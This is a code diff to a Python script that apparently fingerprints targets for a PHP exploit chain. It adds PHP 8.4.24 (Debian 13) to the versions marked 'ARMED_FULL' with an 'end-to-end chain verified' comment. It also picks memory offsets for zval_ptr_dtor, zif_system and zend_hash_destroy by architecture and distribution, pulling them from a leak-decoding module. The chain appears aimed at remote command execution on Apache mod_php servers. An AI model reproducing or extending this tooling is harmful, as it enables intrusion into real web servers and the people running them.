@@ -34,7 +34,9 @@ import re
 import sys
 import urllib.parse
 
-ARMED_FULL = {"8.4.26"}          # end-to-end chain verified
+from decode_leak_cookie import SYMBOL_PROFILES, profile_key
+
+ARMED_FULL = {"8.4.26", "8.4.24"}  # end-to-end chain verified (8.4.24 = Debian 13 package)
 ARMED_ARMING = {"8.5.11"}        # 4096 signature reproduced; disclosure does not transfer
 PREFORK_SAPIS = {"apache2handler"}
 BAD_SAPIS = {"fpm-fcgi", "cgi-fcgi", "php-fpm", "cli", "embed"}
@@ -214,6 +216,26 @@ def main(argv=None):
             if not facts.get("php_version") and data.get("php"):
                 facts["php_version"] = data["php"]
                 check_version(data["php"], report, args)
+
+            # Architecture: the key by which symbol offsets are selected. A target reporting anything
+            # else than these two has no profile and needs --symbol from its own nm.
+            arch = (data.get("arch") or "").strip()
+            facts["arch"] = arch
+            normalised = {"x86_64": "x86_64", "amd64": "x86_64",
+                          "aarch64": "arm64", "arm64": "arm64"}.get(arch)
+            if normalised:
+                distro = (data.get("distro") or "").strip()
+                facts["distro"] = distro
+                report.line("ok", "arch", "%s (%s%s)" % (arch, data.get("os") or "?",
+                                                         ", " + distro if distro else ""))
+                profile = profile_key(normalised, facts.get("php_version"), distro)
+                if facts.get("php_version") and profile not in SYMBOL_PROFILES:
+                    report.line("warn", "symbols", "no offset profile for %s - the chain will need "
+                                                  "--symbol zval_ptr_dtor=0x...,zif_system=0x...,"
+                                                  "zend_hash_destroy=0x... from that binary"
+                                % profile)
+            elif arch:
+                report.line("warn", "arch", "unrecognised %r" % arch)
             sapi = data.get("sapi")
             facts["sapi"] = sapi
             facts["ini"] = {key: data.get(key) for key in
